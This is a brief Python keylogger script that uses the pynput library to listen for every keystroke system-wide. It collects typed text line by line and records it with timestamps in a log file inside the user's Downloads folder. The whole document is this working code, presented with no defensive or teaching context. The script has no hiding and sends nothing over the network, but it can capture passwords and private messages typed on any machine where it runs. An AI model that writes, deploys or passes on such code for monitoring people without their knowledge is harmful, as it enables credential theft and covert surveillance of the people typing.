from pynput.keyboard import Key, Listener
import logging
import os

# Get the user's "Downloads" folder path
downloads_folder = os.path.expanduser('~/Downloads')

# Create the log directory if it doesn't exist
log_dir = os.path.join(downloads_folder, "keylogger_logs")

if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Specify the log file path
log_file_path = os.path.join(log_dir, "key_log.txt")

logging.basicConfig(filename=log_file_path, level=logging.DEBUG,
                    format='%(asctime)s: %(message)s')  # Changed the format

logged_string = ""  # Initialize an empty string to store the typed string

def on_press(key):
    global logged_string  # Declare the use of the global variable

    if key == Key.enter:  # Check if Enter key is pressed
        if logged_string:  # Check if there's a logged string
            logging.info(logged_string)  # Log the accumulated string
            logged_string = ""  # Clear the accumulated string
    else:
        try:
            logged_string += key.char  # Append the pressed key to the accumulated string
        except AttributeError:
            logged_string += " " + str(key) + " "  # Handle non-character keys

with Listener(on_press=on_press) as listener:
    listener.join()
